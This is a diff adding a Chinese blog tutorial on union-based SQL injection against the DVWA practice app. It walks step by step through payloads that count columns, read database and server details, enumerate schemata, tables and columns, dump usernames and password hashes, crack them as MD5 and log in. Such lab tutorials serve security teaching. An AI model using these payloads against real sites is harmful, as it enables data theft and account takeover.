+<p>输入：<code>1&#39; order by 1#</code>  <code>1&#39; order by 2#</code>  <code>1&#39; order by 3#</code>等等<br><img src="https://img-blog.csdnimg.cn/20201031001224830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201031001250266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020103100133944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>我们知道了select查询语句的字段数为 2</p>
+<p><strong>方式2：</strong> <code>union select 1,2,3...</code></p>
+<p><strong>tips：</strong> UNION操作符用于合并两个或多个SELECT语句的结果集，这里需要注意的是：UNION内部的SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型，同时，每条SELECT语句中列的顺序必须相同。</p>
+<p>所以我们构造payload：<br><code>1&#39; union select 1 #</code><br> <code>1&#39; union select 1,2 #</code><br>  <code>1&#39; union select 1,2,3 #</code></p>
+<p><img src="https://img-blog.csdnimg.cn/2020103100245724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201031002531738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201031002622587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h4 id="获取字段显示位"><a href="#获取字段显示位" class="headerlink" title="获取字段显示位"></a>获取字段显示位</h4><p>在页面上会显示从select语句中选取的字段，通过以上方式2中的union select 1,2,3…可判断出具体显示字段的显示位</p>
+<p><strong>显示位的作用：</strong> 在知道显示位之后，就可以通过显示位来显示我们想知道的数据库信息，如数据库的版本，用户信息等…</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入：1&#39; union select 1,2 #</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201031002911853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h4 id="通过显示位获取数据库信息"><a href="#通过显示位获取数据库信息" class="headerlink" title="通过显示位获取数据库信息"></a>通过显示位获取数据库信息</h4><p>这里需要我们知道一些关于数据库中的常用函数<br>传送门：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/fcc5d8e69d68">SQL注入常用函数整理</a></p>
+<ul>
+<li><p>获取当前连接的数据库名称、数据库版本：<br><code>1&#39; union select database(),version() #</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20201031003337859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>获取当前连接数据库的用户<br><code>1&#39; union select user(),2 #</code><br><img src="https://img-blog.csdnimg.cn/2020103100352723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>获取服务器的操作系统、数据库的存储目录<br><code>1&#39; union select @@version_compile_os,@@datadir #</code><br><img src="https://img-blog.csdnimg.cn/20201031003703352.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h4 id="获取数据库中的表名"><a href="#获取数据库中的表名" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h4></li>
+<li><p><strong>获取DBMS中所有数据库的名称</strong></p>
+<p>Mysql安装后默认会创建三个数据库：information_schema、mysql和test；information_schema库下的schemata表中保存着DBMS中的所有数据库名称信息。</p>
+<p>构造payload：<br><code>1&#39; union select 1,schema_name from information_schema.schemata #</code><br>当我们输入这段payload时，报出了一个错误<br><img src="https://img-blog.csdnimg.cn/20201031003944907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>意思是我们的语句没有满足union的语法，没办法，老百度人啦，上网找答案发现是两个select语句查找的内容的字节序编码不一致导致的。确实，union构造的两个select语句查询的字段内容编码必须是一致的，直接改数据库中的编码就可以啦。<br>但是有一个问题，我们是攻击测试，怎么能改后台数据库中的数据呢，所以我们构造语句：<br><code>1&#39; union select 1,hex(schema_name) from information_schema.schemata #</code><br>对查找的内容进行十六进制转码就可以啦<br><img src="https://img-blog.csdnimg.cn/20201031004828575.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>虽然得到的是十六进制的字符串，但是解码还是能得到结果的</p>
+</li>
+<li><p><strong>获取当前连接数据库(dvwa)中的所有表</strong></p>
+<p><code>1&#39; union select 1,group_concat(hex(table_name)) from information_schema.tables where table_schema=database() # </code></p>
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20201031005456291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h4 id="获取表中的列名（字段）"><a href="#获取表中的列名（字段）" class="headerlink" title="获取表中的列名（字段）"></a>获取表中的列名（字段）</h4><p><strong>方式1：</strong> <code>1&#39; union select 1,group_concat(hex(column_name)) from information_schema.columns where table_name=&#39;users&#39; #</code><br><img src="https://img-blog.csdnimg.cn/20201031005803740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>方式2：</strong> 通过猜测的方式，没有第一种方式好用，有兴趣的可以看一看大佬的博客，这里就不说啦<br>传送门：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/54b630f1ec35">猜测字段数和字段名</a></p>
+<h4 id="导出数据库中的数据"><a href="#导出数据库中的数据" class="headerlink" title="导出数据库中的数据"></a>导出数据库中的数据</h4><p>知道有哪些字段名了，我们就可以导出数据啦<br><code>1&#39; union select 1,group_concat(concat_ws(&#39;--&#39;,user,password)) from users #</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20201031010223345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>group_concat()函数是将结果放在一起以都逗号间隔的方式输出，我们也可以一个一个的输出</p>
+<p><code>1&#39; union select 1,concat_ws(&#39;--&#39;,user,password) from users #</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20201031010525269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h4 id="验证导出的数据有效性"><a href="#验证导出的数据有效性" class="headerlink" title="验证导出的数据有效性"></a>验证导出的数据有效性</h4><ul>
+<li>解密</li>
+</ul>
+<p>我们已经导出了用户名和密码，但是密码是加密过的，所以尽我们可能来解密吧（哭泣）<br> 这里我们通过md5成功解密：</p>
+<p> <img src="https://img-blog.csdnimg.cn/20201031011000122.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<ul>
+<li>验证<br>我们登出当前用户，重新进入登陆界面，输入我们刚刚得到的用户名和密码<br><img src="https://img-blog.csdnimg.cn/20201031011213467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201031011228856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>完结撒花~~</li>
+</ul>
 
       
 
@@ -266,7 +356,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2020/11/13/hello-world/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2020/11/13/SQL%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%8F%8ADVWA%E5%AE%9E%E6%88%98/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -278,6 +368,16 @@
 </article>
 
   
+<nav id="article-nav">
+  
+  
+    <a href="/2020/11/13/%E5%AE%9E%E6%88%98_%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E8%8E%B7%E5%8F%96Cookie%E5%8F%8A%E9%98%B2%E5%BE%A1/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
